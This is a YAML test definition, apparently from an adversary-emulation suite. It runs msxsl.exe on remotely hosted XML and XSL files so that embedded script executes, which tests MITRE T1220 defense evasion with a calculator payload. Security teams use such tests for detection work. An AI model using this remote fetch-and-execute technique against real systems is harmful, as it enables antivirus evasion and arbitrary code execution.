api_version: "2.0"
name: MSXSL Bypass using remote files
description: |
    Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
    Requires download of MSXSL.exe. No longer available from Microsoft.
    (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
    Open Calculator.exe when test successfully executed, while AV turned off.
args:
    - name: xslfile
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
    - name: msxsl_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe
    - name: xmlfile
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
uuid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1220: XSL Script Processing'
requirements:
    platforms:
        - os: windows
steps:
    - name: msxsl-bypass-using-remote-files
      inline: |
        "{{.Args.msxsl_exe}}" "{{.Args.xmlfile}}" "{{.Args.xslfile}}"
      executor: command_prompt
      cleanup:
        inline: |
            del -Path {{.Args.msxsl_exe}} >nul 2>&1
        executor: command_prompt
